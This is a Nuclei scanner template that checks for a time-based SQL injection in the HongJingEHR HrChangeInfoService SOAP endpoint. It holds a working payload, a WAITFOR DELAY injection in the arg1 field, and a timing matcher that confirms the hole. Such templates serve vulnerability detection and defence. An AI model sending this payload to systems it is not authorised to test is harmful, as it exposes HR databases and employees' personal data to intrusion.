id: HongJingEHR-HrChangeInfoService-sqlInjection

info:
  name: HongJingEHR-HrChangeInfoService-sqlInjection
  author: iSee857
  severity: high
  description: HongJingEHR-HrChangeInfoService-sqlInjection

requests:
  - method: POST
    raw:
      - |
        POST /services/HrChangeInfoService HTTP/1.1
        Host: {{Host}}
        Content-type:application/xml

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hr="http://www.hjsj.com/HrpService">
        <soapenv:Header/>
          <soapenv:Body>
           <hr:getChangeUsers>
            <arg0>1</arg0>
            <arg1>1';WAITFOR DELAY '0:0:5'--</arg1>
            <arg2>1</arg2>
           </hr:getChangeUsers>
         </soapenv:Body>
        </soapenv:Envelope>
      
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration >= 5"

      - type: status
        status:
          - 200